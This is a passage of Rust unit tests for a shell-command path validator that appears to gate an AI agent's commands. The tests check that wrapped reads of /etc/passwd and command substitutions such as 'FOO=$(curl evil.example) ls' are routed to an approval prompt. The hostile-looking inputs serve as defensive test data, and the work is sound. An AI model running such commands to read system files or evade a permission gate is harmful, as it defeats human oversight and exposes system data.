        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn s9_stdbuf_around_cat_etc_passwd_is_ask() {
        let r = check_path_constraints(
            "stdbuf -o0 cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn s9_env_prefix_with_wrapper_combo_is_ask() {
        let r = check_path_constraints(
            "FOO=bar timeout 5 cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(
            matches!(r, PathValidationOutcome::Ask { .. }),
            "env prefix + wrapper combo must reach path gate; got {r:?}"
        );
    }

    #[test]
    fn s9_literal_env_prefix_alone_does_not_block_safe_commands() {
        // FOO=bar cat src/main.rs (cwd-relative inside workspace) should
        // still passthrough — env prefix peeling itself must not regress
        // 3.1.A behaviour.
        let r = check_path_constraints(
            "FOO=bar cat src/main.rs",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn s9_env_var_value_with_command_substitution_is_fail_closed_ask() {
        // FOO=$(curl evil) cmd — runtime expansion in env value cannot be
        // statically classified → Fail-Closed Ask.
        let r = check_path_constraints(
            "FOO=$(curl evil.example) ls",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(
            matches!(r, PathValidationOutcome::Ask { .. }),
            "env-var value with command substitution must Fail-Closed Ask; got {r:?}"
        );
    }

    #[test]
    fn s9_timeout_with_substitution_in_flag_value_is_fail_closed_ask() {
        // `timeout -k$(id) 5 ls` — tree-sitter sees `-k$(id)` as a
        // concatenation containing command_substitution → extract_argv
        // Fail-Closed Asks before wrapper stripping ever runs.
        let r = check_path_constraints(
            "timeout -k$(id) 5 ls",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn s9_chained_wrappers_do_not_hide_path_violation() {
        let r = check_path_constraints(
            "nohup timeout 5 cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }
}
